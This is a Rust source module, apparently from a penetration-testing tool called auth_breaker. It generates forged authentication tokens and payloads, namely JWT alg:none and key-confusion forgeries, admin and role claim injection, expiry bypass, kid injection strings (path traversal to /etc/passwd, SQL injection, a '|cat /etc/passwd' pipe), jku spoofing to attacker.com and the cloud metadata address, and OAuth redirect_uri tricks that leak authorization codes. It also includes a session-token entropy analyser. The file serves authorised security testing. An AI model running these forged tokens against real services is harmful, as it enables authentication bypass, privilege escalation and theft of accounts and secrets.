use std::fmt;

use base64::Engine;
use base64::engine::general_purpose::URL_SAFE_NO_PAD;

/// Active authentication attack techniques for JWT, session tokens,
/// OAuth flows, and SAML assertions.
///
/// Unlike passive JWT header auditing which detects misconfigurations
/// in observed tokens, auth_breaker actively generates malicious tokens
/// and tests them against the target. It covers the OWASP Testing Guide
/// authentication section: OTG-AUTHN-001 through OTG-AUTHN-010.
/// Categories of authentication attack.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum AuthAttackType {
    JwtAlgNone,
    JwtAlgConfusion,
    JwtClaimTampering,
    JwtExpBypass,
    JwtKidInjection,
    JwtJkuSpoofing,
    JwtNullSignature,
    SessionFixation,
    SessionPrediction,
    SessionEntropy,
    OAuthRedirectManipulation,
    OAuthStateMissing,
    OAuthScopeEscalation,
    OAuthCodeReuse,
    SamlSignatureWrapping,
    SamlCommentInjection,
}

impl fmt::Display for AuthAttackType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::JwtAlgNone => write!(f, "jwt_alg_none"),
            Self::JwtAlgConfusion => write!(f, "jwt_alg_confusion"),
            Self::JwtClaimTampering => write!(f, "jwt_claim_tampering"),
            Self::JwtExpBypass => write!(f, "jwt_exp_bypass"),
            Self::JwtKidInjection => write!(f, "jwt_kid_injection"),
            Self::JwtJkuSpoofing => write!(f, "jwt_jku_spoofing"),
            Self::JwtNullSignature => write!(f, "jwt_null_signature"),
            Self::SessionFixation => write!(f, "session_fixation"),
            Self::SessionPrediction => write!(f, "session_prediction"),
            Self::SessionEntropy => write!(f, "session_entropy"),
            Self::OAuthRedirectManipulation => write!(f, "oauth_redirect_manipulation"),
            Self::OAuthStateMissing => write!(f, "oauth_state_missing"),
            Self::OAuthScopeEscalation => write!(f, "oauth_scope_escalation"),
            Self::OAuthCodeReuse => write!(f, "oauth_code_reuse"),
            Self::SamlSignatureWrapping => write!(f, "saml_signature_wrapping"),
            Self::SamlCommentInjection => write!(f, "saml_comment_injection"),
        }
    }
}

/// A parsed JWT broken into its three components.
#[derive(Debug, Clone)]
pub struct ParsedJwt {
    pub raw: String,
    pub header_b64: String,
    pub payload_b64: String,
    pub signature_b64: String,
    pub header_json: String,
    pub payload_json: String,
}

/// A tampered JWT ready for testing against the target.
#[derive(Debug, Clone)]
pub struct TamperedJwt {
    pub raw: String,
    pub attack_type: AuthAttackType,
    pub description: String,
    pub original_alg: String,
    pub tampered_claims: Vec<(String, String)>,
}

/// Parse a JWT into its three base64-encoded segments.
///
/// Returns None if the token doesn't have exactly 3 dot-separated parts
/// or if the header/payload aren't valid base64 JSON.
pub fn parse_jwt(token: &str) -> Option<ParsedJwt> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return None;
    }

    let header_bytes = URL_SAFE_NO_PAD.decode(parts[0]).ok()?;
    let payload_bytes = URL_SAFE_NO_PAD.decode(parts[1]).ok()?;

    let header_json = String::from_utf8(header_bytes).ok()?;
    let payload_json = String::from_utf8(payload_bytes).ok()?;

    serde_json::from_str::<serde_json::Value>(&header_json).ok()?;
    serde_json::from_str::<serde_json::Value>(&payload_json).ok()?;

    Some(ParsedJwt {
        raw: token.to_string(),
        header_b64: parts[0].to_string(),
        payload_b64: parts[1].to_string(),
        signature_b64: parts[2].to_string(),
        header_json,
        payload_json,
    })
}

/// Generate alg:none attack tokens.
///
/// The classic JWT bypass: change the algorithm to "none" (or variants)
/// and strip the signature. Vulnerable libraries accept the token without
/// verifying the signature because alg=none means "unsigned".
pub fn forge_alg_none(jwt: &ParsedJwt) -> Vec<TamperedJwt> {
    let none_variants = ["none", "None", "NONE", "nOnE", "noNe"];
    let original_alg =
        extract_claim(&jwt.header_json, "alg").unwrap_or_else(|| "unknown".to_string());

    none_variants
        .iter()
        .flat_map(|alg_value| {
            let header = format!("{{\"alg\":\"{}\",\"typ\":\"JWT\"}}", alg_value);
            let header_b64 = URL_SAFE_NO_PAD.encode(header.as_bytes());
            let with_empty_sig = format!("{}.{}.", header_b64, jwt.payload_b64);
            let with_no_sig = format!("{}.{}", header_b64, jwt.payload_b64);
            let with_dot = format!("{}.{}.", header_b64, jwt.payload_b64);

            vec![
                TamperedJwt {
                    raw: with_empty_sig,
                    attack_type: AuthAttackType::JwtAlgNone,
                    description: format!("alg:{} with empty signature", alg_value),
                    original_alg: original_alg.clone(),
                    tampered_claims: vec![("alg".to_string(), alg_value.to_string())],
                },
                TamperedJwt {
                    raw: with_no_sig,
                    attack_type: AuthAttackType::JwtAlgNone,
                    description: format!("alg:{} with missing signature segment", alg_value),
                    original_alg: original_alg.clone(),
                    tampered_claims: vec![("alg".to_string(), alg_value.to_string())],
                },
                TamperedJwt {
                    raw: with_dot,
                    attack_type: AuthAttackType::JwtAlgNone,
                    description: format!("alg:{} with trailing dot", alg_value),
                    original_alg: original_alg.clone(),
                    tampered_claims: vec![("alg".to_string(), alg_value.to_string())],
                },
            ]
        })
        .collect()
}

/// Generate RS256→HS256 algorithm confusion attack tokens.
///
/// When the server uses RS256 (asymmetric), the attacker changes alg to
/// HS256 (symmetric) and signs the token with the server's public key.
/// Vulnerable libraries use the public key as the HMAC secret.
///
/// Returns a token header modified to HS256 — the caller must sign it
/// with the server's public key (which is often available via JWKS endpoint).
pub fn forge_alg_confusion(jwt: &ParsedJwt) -> Vec<TamperedJwt> {
    let original_alg =
        extract_claim(&jwt.header_json, "alg").unwrap_or_else(|| "unknown".to_string());

    let confusion_pairs = [
        ("RS256", "HS256"),
        ("RS384", "HS384"),
        ("RS512", "HS512"),
        ("ES256", "HS256"),
        ("ES384", "HS384"),
        ("ES512", "HS512"),
        ("PS256", "HS256"),
        ("PS384", "HS384"),
        ("PS512", "HS512"),
    ];

    confusion_pairs
        .iter()
        .filter(|(from, _)| original_alg == *from || original_alg == "unknown")
        .map(|(from, to)| {
            let header = replace_claim(&jwt.header_json, "alg", to);
            let header_b64 = URL_SAFE_NO_PAD.encode(header.as_bytes());
            let signing_input = format!("{}.{}", header_b64, jwt.payload_b64);

            TamperedJwt {
                raw: format!("{}.SIGN_WITH_PUBLIC_KEY", signing_input),
                attack_type: AuthAttackType::JwtAlgConfusion,
                description: format!(
                    "{}→{} key confusion — sign with server public key",
                    from, to
                ),
                original_alg: original_alg.clone(),
                tampered_claims: vec![("alg".to_string(), to.to_string())],
            }
        })
        .collect()
}

/// Generate claim tampering payloads: escalate privilege fields.
///
/// Common JWT claim manipulations: admin=true, role=admin, sub→other_user,
/// iss→attacker. Each produces a token that needs re-signing (with alg:none
/// or via key confusion) to be usable.
pub fn forge_claim_tampering(jwt: &ParsedJwt) -> Vec<TamperedJwt> {
    let original_alg =
        extract_claim(&jwt.header_json, "alg").unwrap_or_else(|| "unknown".to_string());

    let escalation_payloads = [
        ("admin", "true"),
        ("role", "admin"),
        ("role", "superadmin"),
        ("role", "root"),
        ("is_admin", "true"),
        ("is_staff", "true"),
        ("permission", "admin"),
        ("group", "administrators"),
        ("scope", "admin read write"),
        ("aud", "*"),
    ];

    escalation_payloads
        .iter()
        .map(|(key, value)| {
            let payload = inject_claim(&jwt.payload_json, key, value);
            let payload_b64 = URL_SAFE_NO_PAD.encode(payload.as_bytes());

            let alg_none_header = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
            let header_b64 = URL_SAFE_NO_PAD.encode(alg_none_header.as_bytes());

            TamperedJwt {
                raw: format!("{}.{}.", header_b64, payload_b64),
                attack_type: AuthAttackType::JwtClaimTampering,
                description: format!("inject {}={} with alg:none", key, value),
                original_alg: original_alg.clone(),
                tampered_claims: vec![
                    ("alg".to_string(), "none".to_string()),
                    (key.to_string(), value.to_string()),
                ],
            }
        })
        .collect()
}

/// Generate JWT exp bypass tokens.
///
/// Remove or extend the expiration claim to bypass token lifetime checks.
pub fn forge_exp_bypass(jwt: &ParsedJwt) -> Vec<TamperedJwt> {
    let original_alg =
        extract_claim(&jwt.header_json, "alg").unwrap_or_else(|| "unknown".to_string());

    let far_future = "9999999999";
    let zero = "0";
    let negative = "-1";

    let mut results = Vec::new();

    let payload_no_exp = remove_claim(&jwt.payload_json, "exp");
    let p_b64 = URL_SAFE_NO_PAD.encode(payload_no_exp.as_bytes());
    let h_b64 = URL_SAFE_NO_PAD.encode(b"{\"alg\":\"none\",\"typ\":\"JWT\"}");
    results.push(TamperedJwt {
        raw: format!("{}.{}.", h_b64, p_b64),
        attack_type: AuthAttackType::JwtExpBypass,
        description: "remove exp claim entirely".to_string(),
        original_alg: original_alg.clone(),
        tampered_claims: vec![("exp".to_string(), "removed".to_string())],
    });

    for (value, desc) in [
        (far_future, "far future exp (year 2286)"),
        (zero, "exp=0 (epoch)"),
        (negative, "exp=-1 (negative)"),
    ] {
        let payload = replace_claim(&jwt.payload_json, "exp", value);
        let p_b64 = URL_SAFE_NO_PAD.encode(payload.as_bytes());
        results.push(TamperedJwt {
            raw: format!("{}.{}.", h_b64, p_b64),
            attack_type: AuthAttackType::JwtExpBypass,
            description: desc.to_string(),
            original_alg: original_alg.clone(),
            tampered_claims: vec![("exp".to_string(), value.to_string())],
        });
    }

    results
}

/// Generate JWT kid injection payloads.
///
/// The kid (Key ID) header parameter is often used to look up the signing
/// key from a database or filesystem. If not properly validated, it enables
/// SQL injection, path traversal, or command injection through the JWT header.
pub fn forge_kid_injection(jwt: &ParsedJwt) -> Vec<TamperedJwt> {
    let original_alg =
        extract_claim(&jwt.header_json, "alg").unwrap_or_else(|| "unknown".to_string());

    let kid_payloads = [
        (
            "../../../../../../dev/null",
            "kid path traversal to /dev/null (sign with empty string)",
        ),
        ("/dev/null", "kid absolute path to /dev/null"),
        (
            "../../../../../../../proc/self/environ",
            "kid traversal to environment variables",
        ),
        (
            "' UNION SELECT 'secret-key' -- ",
            "kid SQL injection to inject known key",
        ),
        ("' OR '1'='1", "kid SQL injection boolean bypass"),
        ("|cat /etc/passwd", "kid command injection via pipe"),
        (
            "http://attacker.com/key",
            "kid URL injection to fetch attacker key",
        ),
        ("@/etc/passwd", "kid curl-style file read"),
    ];

    kid_payloads
        .iter()
        .map(|(kid_value, description)| {
            let header = inject_claim(&jwt.header_json, "kid", kid_value);
            let header_b64 = URL_SAFE_NO_PAD.encode(header.as_bytes());

            TamperedJwt {
                raw: format!("{}.{}.{}", header_b64, jwt.payload_b64, jwt.signature_b64),
                attack_type: AuthAttackType::JwtKidInjection,
                description: description.to_string(),
                original_alg: original_alg.clone(),
                tampered_claims: vec![("kid".to_string(), kid_value.to_string())],
            }
        })
        .collect()
}

/// Generate JKU (JWK Set URL) spoofing payloads.
///
/// The jku header tells the server where to fetch the public key for
/// verification. If the server follows arbitrary jku URLs, the attacker
/// hosts their own JWKS endpoint and signs with their own key.
pub fn forge_jku_spoofing(jwt: &ParsedJwt) -> Vec<TamperedJwt> {
    let original_alg =
        extract_claim(&jwt.header_json, "alg").unwrap_or_else(|| "unknown".to_string());

    let jku_payloads = [
        (
            "http://attacker.com/.well-known/jwks.json",
            "jku to attacker-controlled JWKS",
        ),
        (
            "http://127.0.0.1/.well-known/jwks.json",
            "jku SSRF to localhost",
        ),
        (
            "http://169.254.169.254/.well-known/jwks.json",
            "jku SSRF to AWS metadata",
        ),
        (
            "https://legitimate.com@attacker.com/.well-known/jwks.json",
            "jku URL confusion via @",
        ),
        (
            "https://legitimate.com%40attacker.com/.well-known/jwks.json",
            "jku encoded @ bypass",
        ),
    ];

    jku_payloads
        .iter()
        .map(|(jku_value, description)| {
            let header = inject_claim(&jwt.header_json, "jku", jku_value);
            let header_b64 = URL_SAFE_NO_PAD.encode(header.as_bytes());

            TamperedJwt {
                raw: format!("{}.{}.SIGN_WITH_ATTACKER_KEY", header_b64, jwt.payload_b64),
                attack_type: AuthAttackType::JwtJkuSpoofing,
                description: description.to_string(),
                original_alg: original_alg.clone(),
                tampered_claims: vec![("jku".to_string(), jku_value.to_string())],
            }
        })
        .collect()
}

/// Generate null/empty signature tokens.
///
/// Some implementations accept tokens with empty or null bytes as
/// the signature, bypassing verification entirely.
pub fn forge_null_signature(jwt: &ParsedJwt) -> Vec<TamperedJwt> {
    let original_alg =
        extract_claim(&jwt.header_json, "alg").unwrap_or_else(|| "unknown".to_string());
    let signing_input = format!("{}.{}", jwt.header_b64, jwt.payload_b64);

    let null_sigs = [
        ("", "empty signature"),
        ("AA", "single null byte signature"),
        ("AAAA", "four null bytes signature"),
        (
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
            "32 null bytes signature",
        ),
    ];

    null_sigs
        .iter()
        .map(|(sig, description)| TamperedJwt {
            raw: format!("{}.{}", signing_input, sig),
            attack_type: AuthAttackType::JwtNullSignature,
            description: description.to_string(),
            original_alg: original_alg.clone(),
            tampered_claims: vec![("signature".to_string(), description.to_string())],
        })
        .collect()
}

/// Measure Shannon entropy of a token string.
///
/// Low entropy in session tokens indicates predictability — a session
/// token should have at least 64 bits of entropy (OWASP minimum).
pub fn measure_token_entropy(token: &str) -> f64 {
    if token.is_empty() {
        return 0.0;
    }

    let mut freq = [0u32; 256];
    for byte in token.bytes() {
        freq[byte as usize] += 1;
    }

    let len = token.len() as f64;
    freq.iter()
        .filter(|&&count| count > 0)
        .map(|&count| {
            let p = count as f64 / len;
            -p * p.log2()
        })
        .sum()
}

/// Analyze a batch of session tokens for predictability patterns.
///
/// Returns a score 0.0-1.0 where 1.0 means perfectly random and
/// 0.0 means completely predictable. Checks:
/// - Shannon entropy (should be high)
/// - Sequential pattern detection (incrementing counters)
/// - Common prefix/suffix ratio (static portions)
/// - Character distribution uniformity
pub fn analyze_session_tokens(tokens: &[&str]) -> SessionAnalysis {
    if tokens.is_empty() {
        return SessionAnalysis {
            entropy_bits: 0.0,
            sequential_score: 0.0,
            common_prefix_len: 0,
            common_suffix_len: 0,
            unique_ratio: 0.0,
            verdict: SessionVerdict::InsufficientData,
            min_length: 0,
            max_length: 0,
        };
    }

    let entropies: Vec<f64> = tokens.iter().map(|t| measure_token_entropy(t)).collect();
    let avg_entropy = entropies.iter().sum::<f64>() / entropies.len() as f64;
    let entropy_bits = avg_entropy * tokens[0].len() as f64;

    let common_prefix = common_prefix_length(tokens);
    let common_suffix = common_suffix_length(tokens);

    let sequential = detect_sequential_pattern(tokens);

    let unique_count = {
        let mut seen = std::collections::HashSet::new();
        for t in tokens {
            seen.insert(*t);
        }
        seen.len()
    };
    let unique_ratio = unique_count as f64 / tokens.len() as f64;

    let lengths: Vec<usize> = tokens.iter().map(|t| t.len()).collect();
    let min_length = lengths.iter().copied().min().unwrap_or(0);
    let max_length = lengths.iter().copied().max().unwrap_or(0);

    let verdict = classify_session_security(
        entropy_bits,
        sequential,
        unique_ratio,
        common_prefix,
        min_length,
    );

    SessionAnalysis {
        entropy_bits,
        sequential_score: sequential,
        common_prefix_len: common_prefix,
        common_suffix_len: common_suffix,
        unique_ratio,
        verdict,
        min_length,
        max_length,
    }
}

/// Result of session token analysis.
#[derive(Debug, Clone)]
pub struct SessionAnalysis {
    pub entropy_bits: f64,
    pub sequential_score: f64,
    pub common_prefix_len: usize,
    pub common_suffix_len: usize,
    pub unique_ratio: f64,
    pub verdict: SessionVerdict,
    pub min_length: usize,
    pub max_length: usize,
}

/// Security classification for session tokens.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SessionVerdict {
    Secure,
    Weak,
    Predictable,
    InsufficientData,
}

impl fmt::Display for SessionVerdict {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Secure => write!(f, "SECURE"),
            Self::Weak => write!(f, "WEAK"),
            Self::Predictable => write!(f, "PREDICTABLE"),
            Self::InsufficientData => write!(f, "INSUFFICIENT_DATA"),
        }
    }
}

/// OAuth redirect_uri manipulation payloads.
///
/// Each payload attempts to break out of the legitimate redirect_uri
/// to redirect the authorization code to the attacker's domain.
pub fn generate_oauth_redirect_payloads(legitimate_redirect: &str) -> Vec<OAuthRedirectPayload> {
    let base = legitimate_redirect.trim_end_matches('/');

    vec![
        OAuthRedirectPayload {
            redirect_uri: format!("{}.attacker.com", base),
            attack_type: AuthAttackType::OAuthRedirectManipulation,
            description: "subdomain takeover via appended domain".to_string(),
        },
        OAuthRedirectPayload {
            redirect_uri: format!("{}@attacker.com", base),
            attack_type: AuthAttackType::OAuthRedirectManipulation,
            description: "URL authority confusion via @".to_string(),
        },
        OAuthRedirectPayload {
            redirect_uri: format!("{}%40attacker.com", base),
            attack_type: AuthAttackType::OAuthRedirectManipulation,
            description: "encoded @ URL confusion".to_string(),
        },
        OAuthRedirectPayload {
            redirect_uri: format!("{}/../redirect?url=http://attacker.com", base),
            attack_type: AuthAttackType::OAuthRedirectManipulation,
            description: "path traversal to open redirect".to_string(),
        },
        OAuthRedirectPayload {
            redirect_uri: format!("{}%2f..%2fredirect%3furl%3dhttp://attacker.com", base),
            attack_type: AuthAttackType::OAuthRedirectManipulation,
            description: "encoded path traversal".to_string(),
        },
        OAuthRedirectPayload {
            redirect_uri: format!("{}#@attacker.com", base),
            attack_type: AuthAttackType::OAuthRedirectManipulation,
            description: "fragment injection to leak code".to_string(),
        },
        OAuthRedirectPayload {
            redirect_uri: "http://attacker.com".to_string(),
            attack_type: AuthAttackType::OAuthRedirectManipulation,
            description: "completely different redirect_uri".to_string(),
        },
        OAuthRedirectPayload {
            redirect_uri: format!("{}?response_mode=fragment", base),
            attack_type: AuthAttackType::OAuthRedirectManipulation,
            description: "response_mode override to fragment".to_string(),
        },
        OAuthRedirectPayload {
            redirect_uri: format!("{}\\@attacker.com", base),
            attack_type: AuthAttackType::OAuthRedirectManipulation,
            description: "backslash URL confusion".to_string(),
        },
    ]
}

/// An OAuth redirect_uri manipulation payload.
#[derive(Debug, Clone)]
pub struct OAuthRedirectPayload {
    pub redirect_uri: String,
    pub attack_type: AuthAttackType,
    pub description: String,
}

/// Generate all JWT attack payloads for a given token.
///
/// Orchestrates all JWT manipulation techniques and returns a unified
/// list of tampered tokens ready for testing.
pub fn generate_all_jwt_attacks(token: &str) -> Vec<TamperedJwt> {
    let jwt = match parse_jwt(token) {
        Some(j) => j,
        None => return Vec::new(),
    };

    let mut attacks = Vec::new();
    attacks.extend(forge_alg_none(&jwt));
    attacks.extend(forge_alg_confusion(&jwt));
    attacks.extend(forge_claim_tampering(&jwt));
    attacks.extend(forge_exp_bypass(&jwt));
    attacks.extend(forge_kid_injection(&jwt));
    attacks.extend(forge_jku_spoofing(&jwt));
    attacks.extend(forge_null_signature(&jwt));
    attacks
}

/// Count total attack payloads generated for a token.
pub fn attack_count(token: &str) -> usize {
    generate_all_jwt_attacks(token).len()
}

fn extract_claim(json: &str, key: &str) -> Option<String> {
    let v: serde_json::Value = serde_json::from_str(json).ok()?;
    v.get(key).map(|v| match v {
        serde_json::Value::String(s) => s.clone(),
        other => other.to_string(),
    })
}

fn replace_claim(json: &str, key: &str, value: &str) -> String {
    match serde_json::from_str::<serde_json::Value>(json) {
        Ok(mut v) => {
            if let Some(obj) = v.as_object_mut() {
                if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(value) {
                    obj.insert(key.to_string(), parsed);
                } else {
                    obj.insert(
                        key.to_string(),
                        serde_json::Value::String(value.to_string()),
                    );
                }
            }
            serde_json::to_string(&v).unwrap_or_else(|_| json.to_string())
        }
        Err(_) => json.to_string(),
    }
}

fn inject_claim(json: &str, key: &str, value: &str) -> String {
    replace_claim(json, key, value)
}

fn remove_claim(json: &str, key: &str) -> String {
    match serde_json::from_str::<serde_json::Value>(json) {
        Ok(mut v) => {
            if let Some(obj) = v.as_object_mut() {
                obj.remove(key);
            }
            serde_json::to_string(&v).unwrap_or_else(|_| json.to_string())
        }
        Err(_) => json.to_string(),
    }
}

fn common_prefix_length(tokens: &[&str]) -> usize {
    if tokens.is_empty() {
        return 0;
    }
    let first = tokens[0].as_bytes();
    let mut prefix_len = first.len();

    for token in &tokens[1..] {
        let bytes = token.as_bytes();
        prefix_len = prefix_len.min(bytes.len());
        for i in 0..prefix_len {
            if first[i] != bytes[i] {
                prefix_len = i;
                break;
            }
        }
    }
    prefix_len
}

fn common_suffix_length(tokens: &[&str]) -> usize {
    if tokens.is_empty() {
        return 0;
    }
    let first = tokens[0].as_bytes();
    let mut suffix_len = first.len();

    for token in &tokens[1..] {
        let bytes = token.as_bytes();
        suffix_len = suffix_len.min(bytes.len());
        for i in 0..suffix_len {
            if first[first.len() - 1 - i] != bytes[bytes.len() - 1 - i] {
                suffix_len = i;
                break;
            }
        }
    }
    suffix_len
}

fn detect_sequential_pattern(tokens: &[&str]) -> f64 {
    if tokens.len() < 2 {
        return 0.0;
    }

    let mut sequential_pairs = 0u32;
    let total_pairs = (tokens.len() - 1) as f64;

    for pair in tokens.windows(2) {
        if let (Some(a), Some(b)) = (parse_numeric_suffix(pair[0]), parse_numeric_suffix(pair[1]))
            && (b == a + 1 || b == a + 2)
        {
            sequential_pairs += 1;
        }
    }

    sequential_pairs as f64 / total_pairs
}

fn parse_numeric_suffix(s: &str) -> Option<u64> {
    let numeric_part: String = s
        .chars()
        .rev()
        .take_while(|c| c.is_ascii_digit())
        .collect::<String>()
        .chars()
        .rev()
        .collect();
    if numeric_part.is_empty() {
        return None;
    }
    numeric_part.parse().ok()
}

fn classify_session_security(
    entropy_bits: f64,
    sequential_score: f64,
    unique_ratio: f64,
    common_prefix_len: usize,
    min_length: usize,
) -> SessionVerdict {
    if sequential_score > 0.5 {
        return SessionVerdict::Predictable;
    }

    if unique_ratio < 0.9 {
        return SessionVerdict::Predictable;
    }

    if entropy_bits < 32.0 || min_length < 8 {
        return SessionVerdict::Predictable;
    }

    if entropy_bits < 64.0 || common_prefix_len as f64 > min_length as f64 * 0.5 {
        return SessionVerdict::Weak;
    }

    SessionVerdict::Secure
}

#[cfg(test)]
#[path = "auth_breaker_test.rs"]
mod auth_breaker_test;
